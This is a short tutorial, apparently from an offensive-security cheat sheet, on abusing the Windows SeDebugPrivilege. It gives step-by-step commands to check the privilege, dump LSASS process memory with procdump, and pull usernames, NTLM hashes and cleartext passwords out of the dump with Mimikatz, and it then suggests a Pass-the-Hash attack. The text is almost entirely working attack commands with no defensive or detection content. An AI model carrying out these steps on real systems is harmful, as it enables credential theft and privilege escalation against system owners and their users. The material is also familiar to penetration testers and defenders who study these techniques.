# What is SeDebugPrivilege?

`SeDebugPrivilege` is a special Windows permission that allows a user to inspect, control, or manipulate any process on the system, even those running as SYSTEM, the most powerful user on Windows.

- If you're not an administrator but have SeDebugPrivilege, you can:
- Dump LSASS memory (contains usernames, NTLM hashes, even cleartext passwords).
- Extract credentials using tools like Mimikatz.
- Elevate to SYSTEM using PowerShell tricks.


```bash
whoami /priv

# Output Example:
SeDebugPrivilege    Debug programs    Disabled
```
 "Disabled" is okay — if it shows up, we can still use it!

### 1. Dump LSASS Memory
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
 This creates a memory dump file: `lsass.dmp`.
###  2. Extract Credentials Using Mimikatz
Run Mimikatz:
```bash
mimikatz.exe
```
Inside Mimikatz, enter:
```bash
log                                # Saves all output to a log file
sekurlsa::minidump lsass.dmp       # Load LSASS memory
sekurlsa::logonpasswords           # Extract stored credentials
```
Once you get the hash you can  use it for Pass The Hash attack

